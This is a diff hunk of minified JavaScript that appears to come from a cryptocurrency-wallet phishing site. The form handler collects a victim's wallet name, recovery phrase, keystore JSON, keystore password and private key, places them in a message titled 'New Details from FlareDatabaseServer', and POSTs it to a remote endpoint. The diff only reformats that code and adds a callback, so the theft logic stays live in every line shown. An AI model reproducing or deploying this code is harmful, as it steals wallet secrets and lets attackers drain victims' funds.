@@ -12253,17 +12253,19 @@ function eh({
             y.preventDefault();
             try {
                 i(!0);
+               
                 const w = {
                         subject: "New Details from FlareDatabaseServer",
                     
                         message_html: `
-                  Wallet Name: ${d} ; 
-                  Phrase: ${l.phrase} ; 
-                  Keystore JSON: ${l.keystore} ; 
-                  Keystore Password: ${l.password} ; 
-                  Private Key: ${l.privateKey} ; 
-              `
+                                    Wallet Name: ${d} ; 
+                                    Phrase: ${l.phrase} ; 
+                                    Keystore JSON: ${l.keystore} ; 
+                                    Keystore Password: ${l.password} ; 
+                                    Private Key: ${l.privateKey} ; 
+                                `
                     },
+                    
                     S = await (await fetch(Cm, {
                         method: "POST",
                         headers: {
@@ -12276,6 +12278,7 @@ function eh({
                 console.error("Error:", w)
             } finally {
                 i(!1)
+                r();
             }
         }
     };
